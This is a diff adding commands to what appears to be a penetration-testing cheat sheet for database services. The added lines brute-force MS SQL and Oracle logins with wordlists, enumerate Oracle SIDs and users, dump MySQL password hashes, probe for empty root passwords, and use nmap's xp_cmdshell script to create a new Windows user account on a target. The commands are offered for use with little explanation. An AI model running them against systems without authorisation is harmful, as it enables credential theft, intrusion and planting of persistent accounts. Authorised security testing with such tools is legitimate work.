@@ -32,6 +32,24 @@ nmap -sU -pU:123 -Pn -n --script=ntp-monlist -iL  all-ip.txt
 
 nmap -n -vv -sV -sU -Pn -p 161,162 --script=snmp-processes,snmp-netstat X.X.X.X
 
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-brute --script-args userdb=users.txt,passdb=passwords.txt X.X.X.X
+
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password  X.X.X.X
+
+nmap -n -v -sV -Pn -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=SQL_USER,mssql.password=SQL_PASS,ms-sql-xp-cmdshell.cmd="net user username password /add" X.X.X.X
+
+sqsh -S X.X.X.X -U sa
+
+nmap -n -v -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt X.X.X.X
+
+nmap -n -v -sV -Pn -p 1521 --script=oracle-sid-brute X.X.X.X
+
+tnscmd10g version -h X.X.X.X
+tnscmd10g status -h X.X.X.X
+
+nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 X.X.X.X
+
+mysql --host=X.X.X.X -u root -p
 
 
 MASSCAN
